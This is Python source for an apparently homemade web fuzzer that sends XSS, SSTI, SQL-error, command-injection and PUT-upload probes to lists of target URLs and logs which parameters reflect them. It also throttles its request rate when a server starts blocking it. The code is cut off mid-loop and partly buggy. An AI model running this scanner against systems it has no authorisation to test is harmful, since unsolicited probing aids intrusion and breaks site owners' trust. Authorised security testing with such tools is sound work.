#xss MT public

import requests
req=requests.get("https://drive.google.com/file/d/1JQD9q67e6XvlMokrJRt4nGfr6j1pClk-/view?usp=sharing")
if 'abhishek' in req.text:
    print("\n\n you are allowed by abhishek dirisipo\n\n")
else:
    print("not allowed")
    while True:
        print("you are not allowed ! contact the owner Abhishek Dirisipo  . quit the tool ! now  \n or \n check the network !")

#*****************************

#working 4 multi
import threading
import requests 
import time
import sys
from colorama import Fore, Back, Style
import re
import random
ID= random.randint(10000, 9999999999)
ref_count=-1
with open('xsslogabhi/temp_stats/'+str(ID)+'.abhi','w') as ID1:
    ID1.write("not started")

#from pyfiglet import Figlet

#******  title printing ******

#f = Figlet(font='pagga')
#print(Fore.RED +f.renderText('ultimate xss initiator    ' ))
#f1 = Figlet(font='smblock')
#print(Fore.WHITE +f1.renderText('- by Abhishek Dirisipo' ))

#*** pre defined 
sql_flag=0
thread_limit=7




banner=  Back.BLACK +'''\033[1;31;40m

        (           (       *                             )  (    (      (        )  (           (                         )   (     
        )\ )  *   ) )\ )  (  `     (       *   )       ( /(  )\ ) )\ )   )\ )  ( /(  )\ )  *   ) )\ )    (       *   )  ( /(   )\ )  
    (  (()/(` )  /((()/(  )\))(    )\    ` )  /( (     )\())(()/((()/(  (()/(  )\())(()/(` )  /((()/(    )\    ` )  /(  )\()) (()/(  
    )\  /(_))( )(_))/(_))((_)()\((((_)(   ( )(_)))\   ((_)\  /(_))/(_))  /(_))((_)\  /(_))( )(_))/(_))((((_)(   ( )(_))((_)\   /(_)) 
 _ ((_)(_)) (_(_())(_))  (_()((_))\ _ )\ (_(_())((_)  __((_)(_)) (_))   (_))   _((_)(_)) (_(_())(_))   )\ _ )\ (_(_())   ((_) (_))   
	8    █ █    888██ 8██ 8b   ██    db    888██ 888█    Yb  ██ .d8██. .d8██.    8██ 8b ██ 8██ 888██ 8██    ██    888██ .d8██. 8██b. 
	8    8 8      8    8  8Abhi██   dPYb     8   8wwe     Y██P  YPwww. YPwww.     8  8Ybm█  8    8    8    dPYb     8   8P  Y8 8  .8 
	8b..B█ 8      8    8  8  █  █  dP██Yb    8   8        d██b      ██     ██     8  8  "8  8    8    8   dPwwYb    8   8b  d8 8██K' 
	`Y88P' 88██   8   8██ 8     8 dP    ██   8   888█    dP  Yb `Y██P' `Y██P'    8██ 8   8 8██   8   8██ dP    ██   8   `Y██P' 8  Yb 
                                                                                                                                          
                                                                                                                                                                                                                                                                                                            
                            '''
print(banner)


banner2='''\033[1;37;40m
 
                                                            ░░░░░█▀▄░█░█░ ░█▀█░█▀▄░█░█░▀█▀░█▀▀░█░█░█▀▀░█░█
                                                            ░▄▄▄░█▀▄░░█░░ ░█▀█░█▀▄░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
                                                            ░░░░░▀▀░░░▀░░ ░▀░▀░▀▀░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀
                                                                    ░█▀▄░▀█▀░█▀▄░▀█▀░█▀▀░▀█▀░█▀█░█▀█░░
                                                                    ░█░█░░█░░█▀▄░░█░░▀▀█░░█░░█▀▀░█░█░░
                                                                    ░▀▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀░░░▀▀▀░░ 
	💥 🦅

'''
print(banner2)
#*******************************************************

print("NOTE : \n* This tool main goal is to find the vulnerable point for :")
print("\t✨XSS")
print("\t✨SSRF")
print("\t✨Command Injection")
print("\t✨SSTI")
print("\t✨and can even detect sql error ! - lighter & smarter")

c=0

import glob

input("\n-- press <enter> to start --\n")

#************************** custom task / cheat codes ******************************

cheat_code=input("\n example: 1.post,2.ssti,3.rce,4.sql,5.xss,6.owasp,single,reset (you can use multiple at once) \n enter cheatcode to skip those processes:")

print()

if "post" in cheat_code or "POST" in cheat_code or "Post" in cheat_code or "1" in cheat_code:
    print("\t✨post request is disabled")
    enable_post=False
else:
    enable_post=True
    
if "SSTI" in cheat_code or "ssti" in cheat_code or "Ssti" in cheat_code or "2" in cheat_code:
    enable_ssti=False
    print("\t✨SSTI is disabled")
else:
    enable_ssti=True
    
if "RCE" in cheat_code or "rce" in cheat_code or "Rce" in cheat_code or "3" in cheat_code:
    enable_rce=False
    print("\t✨RCE is disabled")
else:
    enable_rce=True
    
if "sql" in cheat_code or "SQL" in cheat_code or "Sql" in cheat_code or "4" in cheat_code:
    enable_sql=False
    print("\t✨sql is disabled")
else:
    enable_sql=True
    
if "xss" in cheat_code or "XSS" in cheat_code or "Xss" in cheat_code or "5" in cheat_code:
    enable_xss=False
    cheat_code=cheat_code+"owasp" #diable also owasp xss
    print("\t✨xss is disabled")
else:
    enable_xss=True
    
if "owasp" in cheat_code or "OWASP" in cheat_code or "Owasp" in cheat_code or "6" in cheat_code:
    enable_owasp=False
    print("\t✨owasp xss payloads are disabled")
else:
    enable_owasp=True
    
if "reset" in cheat_code or "RESET" in cheat_code or "Reset" in cheat_code :
    reset_count=True
    print("\t✨count will be reset to 0")
else:
    reset_count=False
    
if "single" in cheat_code or "SINGLE" in cheat_code or "Single" in cheat_code :
    enable_ssti=False
    enable_owasp=False
    enable_sql=False
    enable_rce=False
    enable_xss=False

    print("\t✨only single simple xss (all others are in disable mode)")
    single_mode=True
else:
    single_mode=False
    
time.sleep(3)
#***********************************************************************

print("\nList of All text Files in Current Directory:\n")
file_count=0
for file in glob.glob("input/with_param/*.txt") :
    file_count+=1
    print(file_count,file)
for file in glob.glob("input/no_param/*.txt") :
    file_count+=1
    print(file_count,file)
for file in glob.glob("input/*.txt") :
    file_count+=1
    print(file_count,file)
for file in glob.glob("*.txt") :
    file_count+=1
    print(file_count,file)

file_count2=input(Fore.RED +"✨enter file number:  - ")

#********** function for file selecting through serial number *****
def fcount(file_count2):
    file_count=0
    for file in glob.glob("input/with_param/*.txt"):
        file_count+=1
        if file_count==file_count2:
            return file
            
    for file in glob.glob("input/no_param/*.txt"):
        file_count+=1
        if file_count==file_count2:
            return file
                        #1
    for file in glob.glob("input/*.txt"):
        file_count+=1
        if file_count==file_count2:
            return file
                        #2
    for file in glob.glob("*.txt"):
        file_count+=1
        if file_count==file_count2:
            return file
#*******************************************************************
fn=fcount(int(file_count2))
print(Fore.RED +"\nselected file: ",fn)
#***** 


file1 = open(fn, 'r') #open(input("enter file name:"), 'r')

Lines = file1.readlines()
print("🚀Total loaded urls:",len(Lines))
if len(Lines)==0:
    print(Fore.RED +"\n⚠️ ! File is empty ! may be you have already ran over it. please choose another:")
    file_count2=input(Fore.RED +"✨enter file number:  - ")
    fn=fcount(int(file_count2))
    print(Fore.RED +"\nselected file: ",fn)

#print(Fore.CYAN +" press -s- or -anything- to \"auto skip mode\" when network error  (recommended)\n press -a- to \"ask to skip/terminate mode\" when network error \n")
#userin=input("✨enter your mode:  - ")
userin="s"


print(Fore.CYAN +" press 0 or 1 to run only with default single parameter\n press -s- to \"set small parameters list\" \n press -M- to \"set medium parameters list\n press -L- to \"set large parameters list\"\n press -ssrf- to \"set ssrf payloads only\"")
userin2=input("✨enter your mode:  - ")

if "ssrf" in userin2 or "SSRF" in userin2:
    paramdirectory='parameters/parametersSSRF.txt'


elif "L" in userin2 or "l" in userin2:
    paramdirectory='parameters/parametersMax.txt'
    if "ND" in userin2 or "nd" in userin2:
        paramdirectory='parameters/parametersMaxND.txt'
        
elif "M" in userin2 or "m" in userin2:
    paramdirectory='parameters/parameters100.txt'
    if "ND" in userin2 or "nd" in userin2:
        paramdirectory='parameters/parameters100ND.txt'
    
elif "1" in userin2 or "0" in userin2:
    paramdirectory='parameters/noparameters.txt'
    
elif "s" in userin2 or "S" in userin2:
    paramdirectory='parameters/parametersMini.txt'
    if "ND" in userin2 or "nd" in userin2:
        paramdirectory='parameters/parametersMiniND.txt'
    
else:
    paramdirectory='parameters/parameters100.txt'
    
print("--selected parameters:",paramdirectory)
    
user_in=input("✨enter burp collaborator link:") # if it is empty then skip (rce function is at last)


if user_in=="r" or user_in=="R":
    user_in=str(ID)+"."+user_in
    filecollab= open('xsslogabhi/collaborator/recent_collab.txt', 'r')
    user_in=filecollab.readline()
    print("--successfully loaded recent collaborator link --")
    
elif len(user_in)!=0 and len(user_in)>5:
    org_collab=user_in
    user_in=str(ID)+"."+user_in
    with open('xsslogabhi/collaborator/recent_collab.txt', 'w') as fcollab:
        fcollab.write(org_collab)

#***********************************custom header ******************************************************
#X-Request-Purpose: Research
custom_header=input("✨enter custom header: ")
if len(custom_header)!=0:
    custom_header=custom_header.split(":")
    if len(custom_header)==1:
        custom_header.append("")
    custom_header[0]=custom_header[0].replace(" ","")
    custom_header[1]=custom_header[1].replace(" ","")
    print(custom_header)


#************************************ logging into temp_stats *******************************************

with open('xsslogabhi/temp_stats/'+str(ID)+'.abhi','w') as ID1:
    ID1.write(fn)

#**************************************logging into continous_stats *************************************
if not reset_count:
    try:
        with open('xsslogabhi/resume_stats/'+fn+'.'+userin2,'r') as ID1:
            temp=ID1.readline()
            resume_count=int(temp)
            print("💾 previous task has being resumed ...")
    except:
        with open('xsslogabhi/resume_stats/'+fn+'.'+userin2,'w') as ID1:
            ID1.write("0")
            resume_count=0
else:
    with open('xsslogabhi/resume_stats/'+fn+'.'+userin2,'w') as ID1:
        ID1.write("0")
        resume_count=0

#************************************* function 1 (reduce line)****************************************************
def reduce_line():
    if userin2!='0' and userin2!='1' and 1==2: # off
        print("---> reducing line")
        with open(fn, 'r+') as fp:
            Lines1 = fp.readlines()
            fp.seek(0)
            fp.truncate()
            fp.writelines(Lines1[1:])

#*******************************************************************************************************************

#**************************************function 2 write error *********************************************************
def write_error():
    with open('xsslogabhi/errorlogs.txt', 'a') as f:
        f.write("\n"+line)

#******************************************************************************************************************
#**************************************function 3 rce collaborator- just get request ***********************************
def my_function_rce(payload):
    print("[*]command Payload->",payload)
    req=requests.get(target.replace("FUZZ",payload),headers=headers,cookies=cookies,timeout=30)

#******************************************************************************************************************

#**************************************function 4 ssti *********************************************************

def my_function_ssti(payload):
    print("[*]ssti Payload->",payload)
    req=requests.get(target.replace("FUZZ",payload),headers=headers,cookies=cookies,timeout=50)
    req1=req #modified
#                req1=requests.post(target.replace("FUZZ",payload),headers=headers,cookies=cookies)

    #***.    printing reflections on o/p screen get  *****
    temp=req.text
    temp=temp.split("09870987")
    #print(temp)
    tempflag=0
    for i in temp:
        if len(i)!=0:
            op=re.findall("78907890+[\w\W]+",i)
            if len(op)!=0:
                if len(op[0])<=100:
                    print("  [*] output get:",str(op).replace("78907890",""))
                    op=str(op)
                    if "14" in op or "7777" in op or "7 7 7 7" in op or "14 14 14" in op or "141414" in op:
                        print(Fore.WHITE +" ⭐️⭐️⭐️vulnerable to SSTI !",payload)
                        with open('xsslogabhi/ssti_logs.txt','a') as f1:
                            f1.write('\n'+' * '+target.replace("FUZZ",payload))
                    if '7' not in op:
                        print(Fore.WHITE +" ⭐️ may vulnerable to SSTI !",payload)
                        with open('xsslogabhi/ssti_logs2.txt','a') as f1:
                            f1.write('\n'+' * '+target.replace("FUZZ",payload))
#******************************************************************************************************************
#**************************************function 5 xss owap payload detection ***************************************

def my_function_owaspbypass(payload):
    print("[*] Payload->",payload)
    req=requests.get(target.replace("FUZZ",payload),headers=headers,cookies=cookies,timeout=30)
    req1=req #modified
#                req1=requests.post(target.replace("FUZZ",payload),headers=headers,cookies=cookies)

    #***.    printing reflections on o/p screen get  *****
    temp=req.text
    temp=temp.split("09870987")
    #print(temp)
    tempflag=0
    for i in temp:
        if len(i)!=0:
            op=re.findall("78907890+[\w\W]+",i)
            if len(op)!=0:
                if len(op[0])<=1000:
                    print("  [*] output get:",str(op).replace("78907890",""))
                    op=str(op)
                    if "><" in op or "<>" in op:
                        print(Fore.MAGENTA +" ⭐️⭐️ xss filter bypass by owasp payloads !",payload)
                        with open('xsslogabhi/xss_owasplogs.txt','a') as f1:
                            f1.write('\n'+' * '+target.replace("FUZZ",payload))
                    if ">" in op or "<" in op:
                        print(Fore.WHITE +" ⭐️ xss filter bypass by owasp payloads !",payload)
                        with open('xsslogabhi/xss_owasplogs2.txt','a') as f1:
                            f1.write('\n'+' * '+target.replace("FUZZ",payload))
#******************************************************************************************************************

#*******************************************payload function 7 Put path upload ********************************************
def check_put(url,parameter):
    url_put=re.sub(r'\?.*', '', url)
    print("\n testing path upload for :",url_put)
    
    put_parameter=parameter.replace("?","").replace("=","")

    r = requests.put(url_put, data ={put_parameter:'abhishek<abhi>""'})
    
    status_code=str(r.status_code)
    if status_code.startswith('2') or '<abhi>""' in r.text:
        print("-upload Success -")
        with open('xsslogabhi/Put_log.txt','a') as f1:
            f1.write('\n'+' * '+url_put+" * put_parameter: "+put_parameter)        
        
    else:
        print("-path upload Failure - ",r.status_code)

#*****************************************************************************************************

#*******************************************payload function 7 main********************************************
def my_function(payload,parameter):
    print("[*] Payload->",payload)

    
    req=requests.get(target.replace("FUZZ",payload),headers=headers,cookies=cookies,timeout=50)
    
    #************* post 
    if enable_post:
        post_parameter=parameter.replace("?","").replace("=","")
        post_target=target.replace("?","#")

        req1=requests.post(post_target,data={post_parameter:payload},json={post_parameter:payload},headers=headers,cookies=cookies,timeout=50) #for post
    else:
        print("\tpost disabled")
        req1=req
    #print("\t post url:",post_target)
    
    #*************
    
    print("-[",req.status_code,"]")
    if "429" in str(req.status_code):
        print("\tserver is blocking requests..delaying 60 sec")
        time.sleep(60)
#                req1=requests.post(target.replace("FUZZ",payload),headers=headers,cookies=cookies)


    #***.    printing reflections on o/p screen get + double and single quote recognition *****
    print("\t-- get reflections: --")
    temp_main=req.text
    temp=temp_main.split("09870987")
    #print(temp)
    tempflag=0
    for i in temp:
        if len(i)!=0:
            op=re.findall("78907890+[\w\W]+",i)
            if len(op)!=0:
                if len(op[0])<=100:
                    print("  [*] output get:",str(op).replace("78907890",""))
                    
    # double and single quote:               
    temp = temp_main.split("</script>")

    for i in temp:
        r = re.findall(r"<script[\w\W]+", i)
        for match in r:
            script_content = match.replace("<script>", "").strip()
            #print(script_content)
            if '""ab' in script_content or '""AB' in script_content:
                c=script_content.count('"')
                if c>2:
                    print("\033[36m" + "Double quotes vulnerable:" + "\033[0m","")
                    with open('xsslogabhi/xsslogDquotes.txt','a') as f1:
                        f1.write('\n'+' * '+target.replace("FUZZ",payload))

            if "''ab" in script_content or "''AB" in script_content:
                c=script_content.count("'")
                if c>2:
                    print("\033[36m" + "Single quotes vulnerable:" + "\033[0m","")
                    with open('xsslogabhi/xsslogSquotes.txt','a') as f1:
                        f1.write('\n'+' * '+target.replace("FUZZ",payload))

    #******** post reflections ****************
    
    if enable_post:
        print("\t-- post reflections: --")
        temp_main=req1.text
        temp=temp_main.split("09870987")
        #print(temp)
        tempflag=0
        for i in temp:
            if len(i)!=0:
                op=re.findall("78907890+[\w\W]+",i)
                if len(op)!=0:
                    if len(op[0])<=100:
                        print("  [*] output get:",str(op).replace("78907890",""))
                        
        # double and single quote:               
        temp = temp_main.split("</script>")

        for i in temp:
            r = re.findall(r"<script[\w\W]+", i)
            for match in r:
                script_content = match.replace("<script>", "").strip()
                #print(script_content)
                if '""ab' in script_content or '""AB' in script_content:
                    c=script_content.count('"')
                    if c>2:
                        print("\033[36m" + "post Double quotes vulnerable:" + "\033[0m","")
                        with open('xsslogabhi/xsslogpostDquotes.txt','a') as f1:
                            f1.write('\n'+' * '+target.replace("FUZZ",payload))

                if "''ab" in script_content or "''AB" in script_content:
                    c=script_content.count("'")
                    if c>2:
                        print("\033[36m" + "post Single quotes vulnerable:" + "\033[0m","")
                        with open('xsslogabhi/xsslogpostSquotes.txt','a') as f1:
                            f1.write('\n'+' * '+target.replace("FUZZ",payload))
                        
                        
    p="<abhi>\"\""
    p2="<ABHI>\"\""
    p3="<Abhi>\"\""
    f=0 #using f as flag for printing X if not found
    
    
    if "abhi" in req.text or "ABHI" in req.text or "Abhi" in req.text :

        #*************************** high alert -GET.........................

        if p in req.text or p2 in req.text or p3 in req.text:
            print(Fore.RED +"  ⭐️ ⭐️ ⭐️  reflections found in get for:",payload,'\n')
            f=1
            with open('xsslogabhi/xsslog.txt','a') as f1:
                f1.write('\n'+' * * * '+target.replace("FUZZ",payload))

        elif "<abhi>\\\"\\\"" in req.text or "<ABHI>\\\"\\\"" in req.text or "<Abhi>\\\"\\\"" in req.text:
            print(Fore.RED +"  ⭐️ ⭐️ ⭐️  reflections found in get for:",payload,'\n')
            f=1
            with open('xsslogabhi/xsslog.txt','a') as f1:
                f1.write('\n'+' * * * '+target.replace("FUZZ",payload))

        elif "%3cabhi%3e\"\"" in req.text or "%3CABHI%3E\"\"" in req.text or "%3cabhi%3e\"\"" in req.text or "%25%3cabhi%25%33\"\"" in req.text or "%25%3CABHI%25%3E\"\"" in req.text or "%25%3cAbhi%25%3e\"\"" in req.text:
            print(Fore.RED +"  ⭐️ ⭐️ ⭐️  reflections found in get for:",payload,'\n')
            f=1
            with open('xsslogabhi/xsslogDquotes.txt','a') as f1:
                f1.write('\n'+' * * * '+target.replace("FUZZ",payload))


        else:
        #*************************** normal alerts .........................

            if "<abhi>\\\"" in req.text or "<ABHI>\\\"" in req.text or "<Abhi>\\\"" in req.text:
                print(Fore.MAGENTA +"  ⭐️ ⭐️  get reflection <abhi>\\\" only..",payload)
                f=1
                 #saving results for **
                with open('xsslogabhi/xsslog2.txt','a') as f1:
                    f1.write('\n'+' * * '+target.replace("FUZZ",payload))

            else:
            #************* GET ********
                if "<abhi>" in req.text or "<ABHI>" in req.text or "<Abhi>" in req.text:
                    print(Fore.MAGENTA +"   ⭐️ ⭐️  get reflections <abhi> only..",payload)
                    f=1

                    #saving results for *
                    with open('xsslogabhi/xsslog2.txt','a') as f1:
                        f1.write('\n'+' * '+target.replace("FUZZ",payload))

         #*************************** low alerts  *******************************

                if "abhi\"\"" in req.text or "ABHI\"\"" in req.text or "Abhi\"\"" in req.text or "abhi%3e\"\"" in req.text or "ABHI%3E\"\"" in req.text or "Abhi%3c\"\"" in req.text or "Abhi%3C\"\"" in req.text :
                    print(Fore.WHITE +"   ⭐️ get reflections abhi\"\" or \"\"ab only..",payload)
                    f=1
                    #saving results for *
                    with open('xsslogabhi/xsslog3.txt','a') as f1:
                        f1.write('\n'+' * '+target.replace("FUZZ",payload))
                elif "<abhi" in req.text or "<ABHI" in req.text or "<Abhi" in req.text:
                    print(Fore.WHITE +"   ⭐️  get reflections abhi\" only..",payload)
                    f=1
                    #saving results for *
                    with open('xsslogabhi/xsslog3.txt','a') as f1:
                        f1.write('\n'+' * '+target.replace("FUZZ",payload))     
                        
                        
    #*************** POST *************************************************************************************
    
    if "abhi" in req1.text or "ABHI" in req1.text or "Abhi" in req1.text :

        #*************************** high alert -GET.........................

        if p in req1.text or p2 in req1.text or p3 in req1.text:
            print(Fore.RED +"  ⭐️ ⭐️ ⭐️  reflections found in get for:",payload,'\n')
            f=1
            with open('xsslogabhi/xsslogpost.txt','a') as f1:
                f1.write('\n'+' * * * '+target.replace("FUZZ",payload))

        elif "<abhi>\\\"\\\"" in req1.text or "<ABHI>\\\"\\\"" in req1.text or "<Abhi>\\\"\\\"" in req1.text:
            print(Fore.RED +"  ⭐️ ⭐️ ⭐️  reflections found in get for:",payload,'\n')
            f=1
            with open('xsslogabhi/xsslogpost.txt','a') as f1:
                f1.write('\n'+' * * * '+target.replace("FUZZ",payload))

        elif "%3cabhi%3e\"\"" in req1.text or "%3CABHI%3E\"\"" in req1.text or "%3cabhi%3e\"\"" in req1.text or "%25%3cabhi%25%33\"\"" in req1.text or "%25%3CABHI%25%3E\"\"" in req1.text or "%25%3cAbhi%25%3e\"\"" in req1.text:
            print(Fore.RED +"  ⭐️ ⭐️ ⭐️  reflections found in get for:",payload,'\n')
            f=1
            with open('xsslogabhi/xsslogpostDquotes.txt','a') as f1:
                f1.write('\n'+' * * * '+target.replace("FUZZ",payload))


        else:
        #*************************** normal alerts .........................

            if "<abhi>\\\"" in req1.text or "<ABHI>\\\"" in req1.text or "<Abhi>\\\"" in req1.text:
                print(Fore.MAGENTA +"  ⭐️ ⭐️  get reflection <abhi>\\\" only..",payload)
                f=1
                 #saving results for **
                with open('xsslogabhi/xsslogpost2.txt','a') as f1:
                    f1.write('\n'+' * * '+target.replace("FUZZ",payload))

            else:
            #************* GET ********
                if "<abhi>" in req1.text or "<ABHI>" in req1.text or "<Abhi>" in req1.text:
                    print(Fore.MAGENTA +"   ⭐️ ⭐️  get reflections <abhi> only..",payload)
                    f=1

                    #saving results for *
                    with open('xsslogabhi/xsslogpost2.txt','a') as f1:
                        f1.write('\n'+' * '+target.replace("FUZZ",payload))

         #*************************** low alerts  *******************************

                if "abhi\"\"" in req1.text or "ABHI\"\"" in req1.text or "Abhi\"\"" in req1.text or "abhi%3e\"\"" in req1.text or "ABHI%3E\"\"" in req1.text or "Abhi%3c\"\"" in req1.text or "Abhi%3C\"\"" in req1.text :
                    print(Fore.WHITE +"   ⭐️ get reflections abhi\"\" or \"\"ab only..",payload)
                    f=1
                    #saving results for *
                    with open('xsslogabhi/xsslogpost3.txt','a') as f1:
                        f1.write('\n'+' * '+target.replace("FUZZ",payload))
                elif "<abhi" in req1.text or "<ABHI" in req1.text or "<Abhi" in req1.text:
                    print(Fore.WHITE +"   ⭐️  get reflections abhi\" only..",payload)
                    f=1
                    #saving results for *
                    with open('xsslogabhi/xsslogpost3.txt','a') as f1:
                        f1.write('\n'+' * '+target.replace("FUZZ",payload))                            
    

            
    #************** sql alerts **********************
    
    if enable_sql:
        #** sql get
        temp=req.text
        sql_count2=temp.count("sql")+temp.count("SQL")+temp.count("Sql")
        #print("      sql:",sql_count1,"&",sql_count2) #------
        if sql_count1<sql_count2 and "malformed" not in temp and "blocked" not in temp:

            print("....:testing sql again")
            req=requests.get(target.replace("FUZZ",payload),headers=headers,cookies=cookies)
            temp=req.text
            req=requests.get(target,headers=headers,cookies=cookies)

            sql_count2=temp.count("sql")+temp.count("SQL")+temp.count("Sql")

            if sql_count1<sql_count2:
                print("....:reverifying sql")
                req=requests.get(target.replace("FUZZ",payload),headers=headers,cookies=cookies)
                temp=req.text
                sql_count4=temp.count("sql")+temp.count("SQL")+temp.count("Sql")
                #print("      sql:",sql_count1,"&",sql_count4) #-------
                if sql_count1<sql_count4:
                    print(Fore.YELLOW +"*⚠️ contains sql word/query.. ⚠️ ",payload)
                    with open('xsslogabhi/sql_log.txt','a') as f1:
                        f1.write('\n'+' * '+target.replace("FUZZ",payload))
                        f=1 #flag


        #** sql post 
        temp=req1.text
        sql_count2=temp.count("sql")+temp.count("SQL")+temp.count("Sql")
        #print("      sql:",sql_count1,"&",sql_count2) #------
        if sql_count1<sql_count2 and "malformed" not in temp and "blocked" not in temp:

            print("....:testing sql again")
            req=requests.get(target.replace("FUZZ",payload),headers=headers,cookies=cookies)
            temp=req1.text
            req=requests.get(target,headers=headers,cookies=cookies)

            sql_count2=temp.count("sql")+temp.count("SQL")+temp.count("Sql")

            if sql_count1<sql_count2:
                print("....:reverifying sql")
                req=requests.get(target.replace("FUZZ",payload),headers=headers,cookies=cookies)
                temp=req1.text
                sql_count4=temp.count("sql")+temp.count("SQL")+temp.count("Sql")
                #print("      sql:",sql_count1,"&",sql_count4) #-------
                if sql_count1<sql_count4:
                    print(Fore.YELLOW +"*⚠️ contains sql word/query.. ⚠️ ",payload)
                    with open('xsslogabhi/sql_logpost.txt','a') as f1:
                        f1.write('\n'+' * '+target.replace("FUZZ",payload))
                        f=1 #flag


    if f==0:
             print("\t\t-❌-")    
    # ******* ***. *** sql alerts ***** **** end******************************
            
#*******************************************payload function 6 main END ******************************************#



for line in Lines:
    org_target=line
    print(line)  
    try:
        c=c+1
        if c<resume_count:
            continue
        
        #*******************.  parameters load ******* 
        linetemp=line
        parameter=re.findall(r"[?]+[\w\W]+[=]",line)
        
        if len(parameter)==0:
            line=line.replace("\n","")
            linetemp=line=line+"?Id=" #adding parameter if parameter not found !
            parameter="?Id="
        else:
            parameter=parameter[0]


        file2 = open(paramdirectory, 'r') #open(input("enter file name:"), 'r')
        Lines2 = file2.readlines()
#.......
        if len(custom_header)!=0:
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36','referer':'',custom_header[0]:custom_header[1]}
        else:
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36','referer':''}
            
        try:
            ##setting cookies
            session = requests.Session()
            response = session.get(line.replace("\n",""),headers=headers,timeout=50)
            cookies=session.cookies.get_dict()
            print(response)
            if "429" in str(response):
                print("! server is blocking the requests ! delaying 60 sec")
                time.sleep(60)


        except requests.exceptions.RequestException as cE:
            
            try:
                print("\ttesting wheather network connection is there...")
                req=requests.get("https://www.google.com")
            except:
                print("\tplease check Network connection ")
                break
            print("\t..network connection is good..")
            continue

                
                
                
                
            # ***************      skip / ask / stop when network error   *********************
            if userin=='a' or userin=='A':
                print(Fore.MAGENTA +"connection error occured..check network.!:\n",Fore.YELLOW+ " press  -y- to skip and continue \n press -n- to stop the Tool.")
                userin1=input(":")
                if 'y'==userin1 or 'Y'==userin1:
                    print(Fore.YELLOW +"network problem ! skipping.. -->",Fore.RED +"*")
                    continue
                else:
                    print("stopping the tool !! ")
                    break

                print(Fore.CYAN+"skipping the connection error url..",Fore.YELLOW +" --> ")
                continue
            else:
                print(Fore.YELLOW +"network problem ! skipping.. -->",Fore.RED +"*")
                write_error()
                continue

        except requests.exceptions.Timeout as e:
            write_error()
            reduce_line()
            print("\u001b[31;1mOOPS!! Timeout Error.\u001b[0m")
            continue
        except requests.exceptions.HTTPError as err:
            write_error()
            reduce_line()
            print(f"\u001b[31;1m {err}. \u001b[0m")
            continue
        except requests.exceptions.RequestException as e:
            write_error()
            reduce_line()
            print("\u001b[31;1m {e} Can not get target information\u001b[0m")
            continue
        except:

            print("other exception occured !!!",Fore.YELLOW +" skipping-->")
            write_error()
            reduce_line()
            continue
#......
        c2=0
        for i in range(len(Lines2)): #loading parameters one by one
            c2=i
            line=linetemp
            a=str(Lines2[i]).replace("\n","")
#            print(Lines2[i])
            if "?" not in a:
                a="?"+a+"="
            if "defaultparam" in Lines2[i]: 
                a=parameter
            line=line.replace(parameter,a) #parameter load a or "?"+a+"="  
            line=line.replace("/?","?").replace("\n","").replace("FUZZFUZZ","FUZZ") # FUZZFUZZ need to be replaced after new multi parameter payload update 

            target=str(line)
            target=target.replace("fuzz","FUZZ")
            if 'FUZZ' not in target:
                target=target.replace("=","=FUZZ")
                
            print(Back.BLACK+'\033[1;31;40m',"[⚡-",c,"-",c2,":",len(Lines2),"-⚡]",'\033[1;32;40m',target,"\033[1;31;40m[",a,"]")

            print("\033[1;32;40mNote:use , FUZZ to set payload position.")
            
            
            if "defaultparam" in Lines2[i]: #CHECKNG PUT *** *** *** *** *** *** *** **
                try:
                    #check_put(target,parameter)
                    print(parameter)
                except:
                    print("some n/w error for PUT upload ")
                    
                    
 

 
            try:
                getreq=requests.get(org_target.replace("FUZZ","FUZZ>"),headers=headers,cookies=cookies,timeout=30)

                post_parameter=parameter.replace("?","").replace("=","")
                
                post_url=re.sub(r'\?.*', '', org_target) #removing all strings after ?
                postreq=requests.post(post_url,headers=headers,cookies=cookies,timeout=30,data={parameter:"FUZZ>"},json={parameter:"FUZZ>"})
                
                
                print("[",getreq.status_code,"]")
                
        
# ************     429 server blocking detection ******************

                if "429" in str(getreq.status_code):
                    print("! server is blocking the requests ! delaying 60 secs and reducing thread speed !")
                    time.sleep(60)
                    
                    if thread_limit==7:
                        thread_limit=3
                        print("\t speed reduced to 3")
                        
                    elif thread_limit==3:
                        thread_limit=2
                        print("\t speed further reduced to 2")
                        
                    else:
                        thread_limit=1
                        print("\t speed further reduced to 1")

                temp=getreq.text #get
                temp2=postreq.text #post

#		********. ref finder.. in case of cache poisioning ***********

                if "FUZZ>" in temp or "fuzz>" in temp or "Fuzz>" in temp:
                    print(Fore.MAGENTA +"  ⭐️ ⭐️ initial reflections fuzz> found ! for:\n",org_target.replace("FUZZ","FUZZ>"))
                    with open('xsslogabhi/init_bypass.txt','a') as f1:
                        f1.write('\n'+' * '+target)
                        f=1
                        
                if "FUZZ>" in temp2 or "fuzz>" in temp2 or "Fuzz>" in temp2:
                    print(Fore.MAGENTA +"  ⭐️ ⭐️ initial reflections fuzz> found ! for:\n",org_target.replace("FUZZ","FUZZ>"))
                    with open('xsslogabhi/init_bypasspost.txt','a') as f1:
                        f1.write('\n'+' * '+target)
                        f=1                        

                #************** href reflections ****************
                payload1="href=\"FUZZ"
                payload2="href=\"fuzz"
                payload3="href=\'FUZZ"
                payload4="href=\'fuzz"

                #get
                if  payload1 in getreq.text or payload2 in getreq.text or payload3 in getreq.text or payload4 in getreq.text:
                    with open('xsslogabhi/xssloghref.txt','a') as f1:
                        f1.write('\n'+' * '+target.replace("FUZZ",payload))
                        f=1

                #post        
                if  payload1 in postreq.text or payload2 in postreq.text or payload3 in postreq.text or payload4 in postreq.text:
                    with open('xsslogabhi/xsslogposthref.txt','a') as f1:
                        f1.write('\n'+' * '+target.replace("FUZZ",payload))
                        f=1
                        

                temp=getreq.text
                temp2=temp
                sql_count1=temp.count("sql")+temp.count("SQL")+temp.count("Sql")

                #************** main *******************************
                if "FUZZ" in getreq.text or "Fuzz" in getreq.text or "fuzz" in getreq.text :
                    print("the parameter is :",a)
                    ref_temp=getreq.text #to count reflections and compare with next 
                    print("loaded param:",Lines2[i])

    #****
                        # implementing smart skipper for reflections here **  **. **  **
                    if "defaultparam" not in Lines2[i]:

                        if "testing_dwfer" in a:
